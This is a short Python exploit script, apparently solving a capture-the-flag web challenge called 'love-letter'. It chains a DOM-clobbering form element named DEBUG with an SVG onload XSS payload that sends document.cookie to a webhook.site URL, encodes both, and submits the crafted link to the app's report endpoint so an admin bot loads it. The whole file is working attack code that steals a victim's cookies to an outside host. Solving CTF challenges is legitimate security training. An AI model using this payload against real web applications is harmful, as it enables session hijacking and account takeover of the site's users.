import requests
import base64
import urllib.parse

url = "http://love-letter.dh.securinets.tn/" # main app url

webhook = "https://webhook.site/437d16f0-af9e-441a-b42a-0cdcc4025733" # your unique webhook url

recipient = '<form id="config"><input value="sanitize" name="DEBUG"></form>'
recipient = urllib.parse.quote(base64.b64encode(recipient.encode()).decode())

message = f'<svg/onload=fetch("{webhook}/?cookies:"+document.cookie)></script>'
message = urllib.parse.quote(base64.b64encode(message.encode()).decode())

payload = f"http://love-letter/love-letter?recipient={recipient}&message={message}"

print(payload)

requests.post(
    url + "report",
    data={
        "url": payload,
    },
)

# You'll see the flag in the webhook site
